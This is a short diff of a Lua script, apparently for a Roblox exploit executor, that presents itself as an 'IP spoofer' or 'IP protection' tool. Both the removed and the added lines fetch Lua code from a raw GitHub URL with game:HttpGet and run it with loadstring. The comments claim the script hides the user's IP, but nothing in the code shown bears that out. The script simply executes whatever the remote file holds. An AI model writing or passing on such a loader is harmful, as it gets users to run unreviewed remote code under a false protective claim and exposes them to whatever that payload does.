@@ -1,4 +1,4 @@
-spoofedIP = "100.55.69.69" -- your fake ip you can change it to whatever u want enjoy
---This spoofer Blocks the Ip logger logging your real Ip this will alert you when you using an logger script
-loadstring(game:HttpGet("https://raw.githubusercontent.com/GuizzyisbackV2LOL/HelloLua/main/looferrlua", true))()
-print("spoofed ip")
+pcall(function()
+local project = "IP-Protection"
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/RbxSolutions/%s/main/source.lua"):format(project), true))()
+end)
